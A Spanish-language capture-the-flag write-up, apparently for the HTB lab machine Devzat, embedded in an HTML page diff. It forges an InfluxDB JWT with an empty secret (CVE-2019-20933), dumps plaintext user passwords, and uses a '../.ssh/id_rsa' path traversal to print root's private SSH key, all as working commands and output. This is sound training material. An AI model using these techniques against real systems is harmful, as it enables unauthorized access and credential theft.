+                <p>El endpoint <code>/metrics</code> expone métricas del runtime de Go. Combinado con el diseño
+                    REST de la API, esto es inequívocamente <strong>InfluxDB</strong>. Confirmamos la versión
+                    exacta:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> http://localhost:8086/ping <span style="color:#e06c75;">-v</span></code></pre>
+
+                <pre><code class="language-plaintext">&lt; X-Influxdb-Build: <span style="color:#98c379;">OSS</span>
+&lt; X-Influxdb-Version: <span style="color:#e5c07b;">1.7.5</span></code></pre>
+
+                <p>La versión 1.7.5 es vulnerable a <a
+                        href="https://nvd.nist.gov/vuln/detail/cve-2019-20933">CVE-2019-20933</a>. La descripción
+                    del NVD dice:</p>
+
+                <blockquote>
+                    <p>"InfluxDB anterior a 1.7.6 tiene una vulnerabilidad de bypass de autenticación en la función
+                        <code>authenticate</code> de <code>services/httpd/handler.go</code> porque un token JWT puede
+                        tener un SharedSecret vacío (también conocido como shared secret)."</p>
+                </blockquote>
+
+                <p>En otras palabras, si el servidor no tiene configurado ningún secreto compartido (el valor por
+                    defecto), cualquier JWT firmado con una cadena vacía será aceptado como válido. Generamos uno
+                    con un pequeño script Python:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> jwt  <span style="color:#7f848e;"># pip install pyjwt</span>
+<span style="color:#c678dd;">import</span> time
+
+token = jwt.<span style="color:#61afef;">encode</span>(
+    {<span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"admin"</span>, <span style="color:#98c379;">"exp"</span>: time.<span style="color:#61afef;">time</span>() + <span style="color:#e5c07b;">3600</span>},
+    <span style="color:#98c379;">""</span>,  <span style="color:#7f848e;"># secreto vacío</span>
+    algorithm=<span style="color:#98c379;">"HS256"</span>
+)
+<span style="color:#61afef;">print</span>(token)</code></pre>
+
+                <h3>Enumerando la Base de Datos</h3>
+                <p>Con el token forjado, consultamos InfluxDB paso a paso. Primero, listamos las bases de datos
+                    disponibles:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#e06c75;">-G</span> <span style="color:#98c379;">'http://localhost:8086/query'</span> \
+  <span style="color:#e06c75;">-H</span> <span style="color:#98c379;">"Authorization: Bearer &lt;token&gt;"</span> \
+  <span style="color:#e06c75;">--data-urlencode</span> <span style="color:#98c379;">"q=SHOW DATABASES"</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"results"</span>: [{
+    <span style="color:#e06c75;">"series"</span>: [{
+      <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"databases"</span>,
+      <span style="color:#e06c75;">"values"</span>: [[<span style="color:#98c379;">"devzat"</span>], [<span style="color:#98c379;">"_internal"</span>]]
+    }]
+  }]
+}</code></pre>
+
+                <p>Luego listamos las measurements (tablas) dentro de <code>devzat</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#e06c75;">-G</span> <span style="color:#98c379;">'http://localhost:8086/query'</span> \
+  <span style="color:#e06c75;">-H</span> <span style="color:#98c379;">"Authorization: Bearer &lt;token&gt;"</span> \
+  <span style="color:#e06c75;">--data-urlencode</span> <span style="color:#98c379;">"q=SHOW MEASUREMENTS ON devzat"</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"results"</span>: [{
+    <span style="color:#e06c75;">"series"</span>: [{
+      <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"measurements"</span>,
+      <span style="color:#e06c75;">"values"</span>: [[<span style="color:#98c379;">"user"</span>]]
+    }]
+  }]
+}</code></pre>
+
+                <p>Y por último volcamos todos los registros de la measurement <code>user</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#e06c75;">-G</span> <span style="color:#98c379;">'http://localhost:8086/query'</span> \
+  <span style="color:#e06c75;">-H</span> <span style="color:#98c379;">"Authorization: Bearer &lt;token&gt;"</span> \
+  <span style="color:#e06c75;">--data-urlencode</span> <span style="color:#98c379;">"db=devzat"</span> \
+  <span style="color:#e06c75;">--data-urlencode</span> <span style="color:#98c379;">"q=SELECT * FROM \"user\""</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"results"</span>: [{
+    <span style="color:#e06c75;">"series"</span>: [{
+      <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"user"</span>,
+      <span style="color:#e06c75;">"columns"</span>: [<span style="color:#98c379;">"time"</span>, <span style="color:#98c379;">"enabled"</span>, <span style="color:#98c379;">"password"</span>, <span style="color:#98c379;">"username"</span>],
+      <span style="color:#e06c75;">"values"</span>: [
+        [<span style="color:#98c379;">"..."</span>, <span style="color:#e5c07b;">false</span>, <span style="color:#98c379;">"WillyWonka2021"</span>,                 <span style="color:#98c379;">"wilhelm"</span>],
+        [<span style="color:#98c379;">"..."</span>, <span style="color:#e5c07b;">true</span>,  <span style="color:#98c379;">"woBeeYareedahc7Oogeephies7Aiseci"</span>, <span style="color:#98c379;">"catherine"</span>],
+        [<span style="color:#98c379;">"..."</span>, <span style="color:#e5c07b;">true</span>,  <span style="color:#98c379;">"RoyalQueenBee$"</span>,                  <span style="color:#98c379;">"charles"</span>]
+      ]
+    }]
+  }]
+}</code></pre>
+
+                <p>Las credenciales <code>catherine:woBeeYareedahc7Oogeephies7Aiseci</code> son válidas para SSH.
+                    Iniciamos sesión como <code>catherine</code> y recogemos la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios — Path Traversal en el Servicio de Chat de Desarrollo</h2>
+                <p>Ahora con acceso como <code>catherine</code> podemos por fin leer esos archivos de backup.
+                    Descomprimimos ambos y hacemos diff en el fichero más interesante:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">diff</span> main/commands.go dev/commands.go</code></pre>
+
+                <p>El diff revela que la versión de desarrollo añade un nuevo comando <code>file</code> a la
+                    aplicación de chat:</p>
+
+                <pre><code class="language-go"><span style="color:#7f848e;">// Imports añadidos en la versión dev:</span>
+<span style="color:#98c379;">"bufio"</span>
+<span style="color:#98c379;">"os"</span>
+<span style="color:#98c379;">"path/filepath"</span>
+
+<span style="color:#7f848e;">// Registro del nuevo comando:</span>
+file = commandInfo{<span style="color:#98c379;">"file"</span>, <span style="color:#98c379;">"Paste a files content directly to chat [alpha]"</span>, fileCommand, <span style="color:#e5c07b;">1</span>, <span style="color:#e5c07b;">false</span>, <span style="color:#e5c07b;">nil</span>}
+
+<span style="color:#7f848e;">// Handler del nuevo comando:</span>
+<span style="color:#c678dd;">func</span> <span style="color:#61afef;">fileCommand</span>(u *user, args []<span style="color:#e5c07b;">string</span>) {
+    <span style="color:#c678dd;">if</span> <span style="color:#61afef;">len</span>(args) &lt; <span style="color:#e5c07b;">2</span> {
+        u.<span style="color:#61afef;">system</span>(<span style="color:#98c379;">"You need to provide the correct password to use this function"</span>)
+        <span style="color:#c678dd;">return</span>
+    }
+
+    path := args[<span style="color:#e5c07b;">0</span>]
+    pass := args[<span style="color:#e5c07b;">1</span>]
+
+    <span style="color:#7f848e;">// Comprueba la contraseña hardcodeada</span>
+    <span style="color:#c678dd;">if</span> pass != <span style="color:#98c379;">"CeilingCatStillAThingIn2021?"</span> {
+        u.<span style="color:#61afef;">system</span>(<span style="color:#98c379;">"You did provide the wrong password"</span>)
+        <span style="color:#c678dd;">return</span>
+    }
+
+    <span style="color:#7f848e;">// Obtiene el CWD</span>
+    cwd, err := os.<span style="color:#61afef;">Getwd</span>()
+
+    <span style="color:#7f848e;">// Construye la ruta a imprimir</span>
+    printPath := filepath.<span style="color:#61afef;">Join</span>(cwd, path)
+
+    <span style="color:#7f848e;">// Comprueba si el fichero existe</span>
+    <span style="color:#c678dd;">if</span> _, err := os.<span style="color:#61afef;">Stat</span>(printPath); err == <span style="color:#e5c07b;">nil</span> {
+        file, err := os.<span style="color:#61afef;">Open</span>(printPath)
+        <span style="color:#7f848e;">// ... lee e imprime línea por línea</span>
+    }
+}</code></pre>
+
+                <p>Observaciones clave: el comando <code>file</code> exige una contraseña hardcodeada
+                    (<code>CeilingCatStillAThingIn2021?</code>), construye la ruta del fichero uniendo el
+                    <em>directorio de trabajo actual</em> con la ruta suministrada por el usuario mediante
+                    <code>filepath.Join</code>, y devuelve el contenido del fichero línea a línea por el chat. El
+                    comando solo está presente en la versión de <strong>desarrollo</strong>, así que necesitamos
+                    encontrar dónde está corriendo. El puerto 8443 es el desconocido.</p>
+
+                <h3>Conectando al Chat de Desarrollo en el Puerto 8443</h3>
+                <pre><code class="language-bash">catherine@devzat:~$ <span style="color:#61afef;">ssh</span> <span style="color:#e06c75;">-l</span> xd devzat.htb <span style="color:#e06c75;">-p</span> 8443</code></pre>
+
+                <pre><code class="language-plaintext">devbot: xd has joined the chat
+
+xd: /commands
+[SYSTEM] Commands
+[SYSTEM] clear - Clears your terminal
+[SYSTEM] ...
+[SYSTEM] <span style="color:#98c379;">file - Paste a files content directly to chat [alpha]</span></code></pre>
+
+                <p>El comando <code>file</code> está disponible. Probamos primero con la ruta más obvia:</p>
+
+                <pre><code class="language-plaintext">xd: /file /root/.ssh/id_rsa CeilingCatStillAThingIn2021?
+[SYSTEM] The requested file @ <span style="color:#e06c75;">/root/devzat/root/.ssh/id_rsa</span> does not exist!</code></pre>
+
+                <p>El mensaje de error expone el directorio de trabajo: <code>/root/devzat</code>. La aplicación
+                    está anteponiendo esto a nuestra ruta, por lo que una ruta absoluta se convierte en
+                    <code>/root/devzat/root/.ssh/id_rsa</code>. Sin embargo, <code>filepath.Join</code> no
+                    sanitiza las secuencias de traversal <code>../</code>, por lo que podemos escapar del CWD:</p>
+
+                <pre><code class="language-plaintext">xd: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
+[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
+[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
+[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
+[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
+[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
+[SYSTEM] -----END OPENSSH PRIVATE KEY-----</code></pre>
+
+                <p>La clave SSH privada de root, servida directamente a través del chat. La copiamos a nuestra
+                    máquina, ajustamos permisos y nos conectamos:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">chmod</span> 600 id_rsa
+<span style="color:#61afef;">ssh</span> <span style="color:#e06c75;">-i</span> id_rsa root@devzat.htb</code></pre>
+
+                <p>Acceso root conseguido. Máquina completada.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
